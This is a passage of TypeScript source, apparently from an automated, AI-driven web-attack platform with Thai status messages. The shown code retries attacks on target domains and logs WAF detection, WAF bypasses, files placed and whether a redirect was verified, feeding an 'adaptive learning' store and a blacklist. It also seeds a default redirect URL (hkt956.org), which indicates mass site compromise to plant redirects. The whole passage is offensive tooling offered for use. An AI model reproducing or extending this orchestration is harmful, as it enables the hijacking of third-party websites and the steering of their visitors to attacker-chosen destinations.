          await emitEvent("attacking", `⚔️ ${target.domain} — ${status.liveProgress.phase} (${status.liveProgress.progress || 0}%)${attempt > 0 ? ` [retry #${attempt}]` : ""}`, 0, {
            domain: target.domain,
            deployId,
            phase: status.liveProgress.phase,
            progress: status.liveProgress.progress,
          });
        }
      }

      // ═══ ATTACK FAILED — Record attempt for AI analysis ═══
      const attackDuration = Date.now() - attackStartTime;
      const attemptRecord: AttackAttemptRecord = {
        attemptNumber: attempt + 1,
        method: currentMethodPriority[0] || "unified_pipeline",
        exploitType: "multi_step",
        wafDetected: target.waf || null,
        httpStatus: jobFinalStatus === "timeout" ? 408 : null,
        responseSnippet: jobResponseSnippet,
        errorMessage: `${jobFinalStatus}: ${jobPhase}`,
        duration: attackDuration,
        timestamp: Date.now(),
      };
      attemptHistory.push(attemptRecord);

      // ═══ ADAPTIVE LEARNING: Record FAILURE ═══
      recordAttackOutcome({
        targetDomain: target.domain,
        cms: target.cms || null,
        cmsVersion: target.cmsVersion || null,
        serverType: target.serverType || null,
        phpVersion: target.phpVersion || null,
        wafDetected: target.waf || null,
        wafStrength: null,
        vulnScore: target.vulnScore || null,
        method: currentMethodPriority[0] || "unified_pipeline",
        exploitType: "multi_step",
        payloadType: null,
        wafBypassUsed: [],
        payloadModifications: [],
        attackPath: null,
        attemptNumber: attempt + 1,
        isRetry: attempt > 0,
        previousMethodsTried: attemptHistory.slice(0, -1).map(a => a.method),
        success: false,
        httpStatus: jobFinalStatus === "timeout" ? 408 : null,
        errorCategory: jobFinalStatus,
        errorMessage: `${jobFinalStatus}: ${jobPhase}`,
        filesPlaced: 0,
        redirectVerified: false,
        durationMs: attackDuration,
        aiFailureCategory: null,
        aiReasoning: null,
        aiConfidence: null,
        aiEstimatedSuccess: null,
        sessionId: null,
        agenticSessionId: sessionId,
      }).catch((e) => console.error(`[AdaptiveLearning] record failure error: ${e.message}`));

      if (attempt >= maxRetries) {
        // ═══ BLACKLIST: Record failed attack ═══
        recordFailedAttack({
          domain: target.domain,
          reason: `Failed after ${attempt + 1} attempts: ${jobFinalStatus}`,
          errors: attemptHistory.map(a => a.errorMessage || "unknown"),
          durationMs: Date.now() - attackStartTime,
          cms: target.cms || null,
          serverType: target.serverType || null,
          waf: target.waf || null,
        }).catch(() => {});

        await emitEvent("failed", `❌ ${target.domain} — ล้มเหลวหลัง ${attempt + 1} ครั้ง (AI retries exhausted) → เพิ่มใน blacklist`, 0, {
          domain: target.domain,
          deployId,
          totalAttempts: attempt + 1,
        });
        return { target, success: false, reason: `failed after ${attempt + 1} attempts`, deployId };
      }

      await emitEvent("ai_retry", `🔄 ${target.domain} — ล้มเหลว (${jobFinalStatus}), AI Strategist กำลังวิเคราะห์...`, 0, {
        domain: target.domain,
        attempt,
        status: jobFinalStatus,
      });

    } catch (e: any) {
      const attackDuration = Date.now() - attackStartTime;
      const attemptRecord: AttackAttemptRecord = {
        attemptNumber: attempt + 1,
        method: currentMethodPriority[0] || "unified_pipeline",
        exploitType: "multi_step",
        wafDetected: target.waf || null,
        httpStatus: null,
        responseSnippet: "",
        errorMessage: e.message,
        duration: attackDuration,
        timestamp: Date.now(),
      };
      attemptHistory.push(attemptRecord);

      // ═══ ADAPTIVE LEARNING: Record ERROR ═══
      recordAttackOutcome({
        targetDomain: target.domain,
        cms: target.cms || null,
        cmsVersion: target.cmsVersion || null,
        serverType: target.serverType || null,
        phpVersion: target.phpVersion || null,
        wafDetected: target.waf || null,
        wafStrength: null,
        vulnScore: target.vulnScore || null,
        method: currentMethodPriority[0] || "unified_pipeline",
        exploitType: "multi_step",
        payloadType: null,
        wafBypassUsed: [],
        payloadModifications: [],
        attackPath: null,
        attemptNumber: attempt + 1,
        isRetry: attempt > 0,
        previousMethodsTried: attemptHistory.slice(0, -1).map(a => a.method),
        success: false,
        httpStatus: null,
        errorCategory: "exception",
        errorMessage: e.message,
        filesPlaced: 0,
        redirectVerified: false,
        durationMs: attackDuration,
        aiFailureCategory: null,
        aiReasoning: null,
        aiConfidence: null,
        aiEstimatedSuccess: null,
        sessionId: null,
        agenticSessionId: sessionId,
      }).catch((err) => console.error(`[AdaptiveLearning] record error error: ${err.message}`));

      if (attempt >= maxRetries) {
        // ═══ BLACKLIST: Record error ═══
        recordFailedAttack({
          domain: target.domain,
          reason: `Error after ${attempt + 1} attempts: ${e.message}`,
          errors: attemptHistory.map(a => a.errorMessage || "unknown"),
          durationMs: Date.now() - attackStartTime,
          cms: target.cms || null,
          serverType: target.serverType || null,
          waf: target.waf || null,
        }).catch(() => {});

        await emitEvent("failed", `❌ ${target.domain} — Error หลัง ${attempt + 1} ครั้ง: ${e.message} → เพิ่มใน blacklist`, 0);
        return { target, success: false, reason: e.message };
      }

      await emitEvent("ai_retry", `🔄 ${target.domain} — Error: ${e.message}, AI Strategist กำลังวิเคราะห์...`, 0);
    }
  }

  return { target, success: false, reason: "max retries exhausted" };
}

// ═══════════════════════════════════════════════════════
//  SESSION MANAGEMENT
// ═══════════════════════════════════════════════════════
async function updateSessionStatus(sessionId: number, status: string, detail?: string) {
  try {
    const db = await getDb();
    if (!db) return;
    
    const updates: Record<string, any> = {
      status,
      lastActivityAt: new Date(),
    };
    if (status === "completed" || status === "stopped" || status === "error") {
      updates.completedAt = new Date();
    }
    if (detail) {
      updates.currentPhase = detail.substring(0, 128);
    }
    
    await db.update(agenticSessions)
      .set(updates)
      .where(eq(agenticSessions.id, sessionId));
  } catch { /* best-effort */ }
}

export async function stopAgenticSession(sessionId: number): Promise<{ success: boolean }> {
  const state = activeSessions.get(sessionId);
  if (state) {
    state.abortController.abort();
    state.status = "stopped";
    activeSessions.delete(sessionId);
  }
  await updateSessionStatus(sessionId, "stopped", "Stopped by user");
  return { success: true };
}

export async function getAgenticSessionStatus(sessionId: number) {
  const db = await getDb();
  if (!db) return null;
  
  const [session] = await db.select()
    .from(agenticSessions)
    .where(eq(agenticSessions.id, sessionId));
  
  if (!session) return null;
  
  // Merge in-memory events if session is still active
  const memState = activeSessions.get(sessionId);
  const events = memState ? memState.events.slice(-100) : (session.eventsLog as AgenticEvent[] || []);
  
  return {
    ...session,
    isRunning: !!memState,
    events,
  };
}

export async function listAgenticSessions(userId: number, page = 1, limit = 20) {
  const db = await getDb();
  if (!db) return { items: [], total: 0 };
  
  const [items, [countResult]] = await Promise.all([
    db.select()
      .from(agenticSessions)
      .where(eq(agenticSessions.userId, userId))
      .orderBy(desc(agenticSessions.createdAt))
      .limit(limit)
      .offset((page - 1) * limit),
    db.select({ count: sql<number>`count(*)` })
      .from(agenticSessions)
      .where(eq(agenticSessions.userId, userId)),
  ]);
  
  return { items, total: countResult?.count || 0 };
}

export function getActiveSessionCount(): number {
  return activeSessions.size;
}

// ═══════════════════════════════════════════════════════
//  SEED DEFAULT REDIRECT URL
// ═══════════════════════════════════════════════════════
export async function seedDefaultRedirectUrl() {
  try {
    const db = await getDb();
    if (!db) return;
    
    const existing = await db.select().from(redirectUrlPool).limit(1);
    if (existing.length === 0) {
      await db.insert(redirectUrlPool).values({
        url: DEFAULT_REDIRECT_URL,
        label: "hkt956.org (Default)",
        weight: 10,
        isActive: true,
        isDefault: true,
      });
      console.log("[Agentic] Seeded default redirect URL: " + DEFAULT_REDIRECT_URL);
    }
  } catch (e: any) {
    console.error("[Agentic] Failed to seed default redirect:", e.message);
  }
}
